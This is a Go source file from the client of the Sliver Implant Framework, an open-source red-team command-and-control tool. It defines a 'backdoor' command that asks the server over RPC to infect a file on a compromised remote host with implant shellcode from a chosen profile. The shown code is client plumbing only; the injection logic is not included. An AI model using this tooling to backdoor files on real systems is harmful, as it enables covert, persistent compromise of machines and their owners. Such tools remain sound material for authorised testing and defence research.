package commands

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"fmt"

	cctx "github.com/bishopfox/sliver/client/context"
	"github.com/bishopfox/sliver/client/spin"
	"github.com/bishopfox/sliver/client/transport"
	"github.com/bishopfox/sliver/client/util"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

// Backdoor - Infect a remote file with a sliver shellcode
type Backdoor struct {
	Positional struct {
		RemotePath string `description:"remote path to file to be backdoored" required:"1-1"`
	} `positional-args:"yes" required:"yes"`

	Options struct {
		Profile string `long:"profile" short:"p" description:"implant profile to use for service binary" required:"yes"`
	} `group:"backdoor options"`
}

// Execute - Infect a remote file with a sliver shellcode
func (b *Backdoor) Execute(args []string) (err error) {
	session := cctx.Context.Sliver.Session
	if session == nil {
		return
	}

	profileName := b.Options.Profile
	remoteFilePath := b.Positional.RemotePath

	ctrl := make(chan bool)
	msg := fmt.Sprintf("Backdooring %s ...", remoteFilePath)
	go spin.Until(msg, ctrl)
	backdoor, err := transport.RPC.Backdoor(context.Background(), &sliverpb.BackdoorReq{
		FilePath:    remoteFilePath,
		ProfileName: profileName,
		Request:     ContextRequest(session),
	})
	ctrl <- true
	<-ctrl
	if err != nil {
		fmt.Printf(util.Error+"Error: %v\n", err)
		return
	}

	if backdoor.Response != nil && backdoor.Response.Err != "" {
		fmt.Printf(util.Error+"Error: %s\n", backdoor.Response.Err)
		return
	}

	fmt.Printf(util.Info+"Uploaded backdoored binary to %s\n", remoteFilePath)
	return
}
